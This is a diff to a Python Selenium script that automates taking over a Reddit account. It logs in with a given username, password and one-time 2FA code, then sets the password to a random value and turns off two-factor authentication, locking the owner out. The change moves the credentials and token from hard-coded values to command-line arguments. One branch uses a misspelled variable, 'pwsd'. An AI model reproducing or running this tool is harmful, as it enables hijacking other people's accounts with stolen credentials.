@@ -19,13 +19,9 @@ INVALID_CREDS = -1
 SUCCESS_NO_TWOAUTH = 0
 SUCCESS_TWOAUTH = 1
 
-# globals
-driver = None
-
 # Setup the headless browser with Gecko for Firefox and open reddit's login page
 # Note: firefox (gecko) driver must be in system PATH for this to work
 def setup():
-    global driver
     options = webdriver.FirefoxOptions()
     # options.add_argument('--headless')
     driver = webdriver.Firefox(options=options)
@@ -33,9 +29,11 @@ def setup():
     # Visit the webpage.
     driver.get('https://reddit.com/login')
 
+    return driver
+
 
 # Returns False if login failed with supplied credentials, True otherwise
-def do_login(**credentials):
+def do_login(driver, **credentials):
     # Send credentials
     user_field = driver.find_element_by_id('loginUsername')
     pass_field = driver.find_element_by_id('loginPassword')
@@ -63,7 +61,7 @@ def do_login(**credentials):
 # returns -1 if login failed due to invalid auth or other error
 # 0 upon login success only
 # pre: make sure code is exactly 6 digits when calling this function
-def do_twoauth(code):
+def do_twoauth(driver, code):
     # throw an error if the 2fa field cannot be found
     otp_field = None
     print("attempting 2auth...")
@@ -97,7 +95,7 @@ def do_twoauth(code):
 
 
 # Change the password and disable their 2fa! New password will be returned; False if error
-def do_password_change(old_password):
+def do_password_change(driver, old_password):
     # password change to random uuid.hex format
     print("changing password")
     driver.get('https://www.reddit.com/prefs/update')
@@ -114,12 +112,14 @@ def do_password_change(old_password):
     save_button = driver.switch_to.active_element
     save_button.click()
     time.sleep(1)
-    print('password changed; disabling twofa')
+    print('password changed')
     print('new password: ' + new_password)
 
     # disable 2fa
     disable_tfa_list = driver.find_elements_by_id('tfa-enable-col-second-variant')
+    print(disable_tfa_list)
     if len(disable_tfa_list) > 0 and disable_tfa_list[0].is_displayed():
+        print('disabling twofa')
         disable_tfa_list[0].click()
         while True:
             time.sleep(0.5)
@@ -130,27 +130,24 @@ def do_password_change(old_password):
         driver.switch_to.active_element.send_keys(Keys.TAB)
         driver.switch_to.active_element.send_keys(Keys.TAB)
         driver.switch_to.active_element.send_keys(Keys.RETURN)
-        print('2fa disabled!')
-    else:
-        print('error. twofa may not be enabled for this account')
-        return False
 
     return new_password
     
 
-def go():
-    setup()
-    cred_status = do_login(Username='2fabusters', Password='attackatdawn')
+def go(user, pswd, token):
+    driver = setup()
+    cred_status = do_login(driver, Username=user,
+                           Password=pswd)
     twoauth_correct = False
     if cred_status == SUCCESS_TWOAUTH:
         print('login good; trying twoauth')
-        twoauth_correct = do_twoauth('932485')
+        twoauth_correct = do_twoauth(driver, token)
         if twoauth_correct:
-            do_password_change('attackatdawn')
+            do_password_change(driver, pswd)
     elif cred_status == SUCCESS_NO_TWOAUTH:
         print('no twoauth, we are in. Time to change password')
-        do_password_change('attackatdawn')
+        do_password_change(driver, pwsd)
 
 if __name__ == '__main__':
-    go()
+    go(sys.argv[1], sys.argv[2], sys.argv[3])
 
